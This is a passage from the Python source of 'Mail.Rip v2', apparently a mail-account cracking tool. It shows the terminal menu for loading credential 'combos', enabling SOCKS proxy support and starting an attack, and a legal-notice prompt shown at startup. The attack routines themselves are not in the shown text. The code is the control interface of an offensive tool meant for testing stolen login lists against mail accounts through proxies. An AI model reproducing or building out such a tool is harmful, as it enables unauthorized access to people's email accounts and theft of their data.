            [1] SET DEFAULT VALUES        [2] DE-/ACTIVATE PROXY-SUPPORT
            [3] LOAD COMBOS               [4] START ATTACK
            
                                          [0] EXIT MAIL.RIP V2
            
            #####################################################[v2|R9]

'''

# often used phrases:
p1 = '\nPress [ENTER] to return to main menu'


# [*** MAIN ***]
# ##############
def mainmenu():
    '''
    The main menu.

    :return: None
    '''
    # show logo on a clean screen:
    clean()
    print(colorama.Fore.RED + main_logo)
    option = input('Choose an option, please:    ' + colorama.Fore.YELLOW)
    # option 0 exits Mail.Rip v2:
    if option == '0':
        clean()
        sys.exit(colorama.Fore.YELLOW + '\n\nClosing Mail.Rip v2 ...\nSee you again!')
    # option 1 for setting up default values:
    elif option == '1':
        status_msg = setdefaults()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7 + '\nDefault values changed.' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nDefault values not changed.' + f'{p1}')
    # option 2 for setting up proxy-support:
    elif option == '2':
        status_msg = proxysupport()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                  + f'\nProxy-support has been activated using {str(type_socks)} proxys.' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nWARNING\n' + '-'*7 + '\nProxy-support is still deactivated.' + f'{p1}')
    # option 3 for loading combos for an attack:
    elif option == '3':
        status_msg = comboloader()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                  + f'\nCombos successfully loaded. Amount: {str(len(combos))}' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nLoading combos failed.' + f'{p1}')
    # option 4 for starting an attack:
    elif option == '4':
        startattack()
    # any other input restarts the mainmenu function:
    else:
        clean()
        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*4 + '\nNo option entered.' + f'{p1}')
    return None


# on startup, show "legal notices" logo first and wait for user confirmation:
clean()
print(colorama.Fore.RED + legal_logo)
legal_confirm = input('CONFIRM WITH [ENTER] OR TYPE "NO":    ' + colorama.Fore.YELLOW)
# if user says no, exit Mail.Rip v2:
if legal_confirm == 'NO' or legal_confirm == 'no' or legal_confirm == 'n':
    clean()
    sys.exit(colorama.Fore.RED
             + '\nLegal Notices not confirmed.\nMail.Rip v2 cannot be run without confirming the '
             + '<< Legal Notices >>.\n\n')
else:
    pass

# after confirmation start main menu:
while True:
    mainmenu()

# DrPython3 (C) 2021 @ GitHub.com
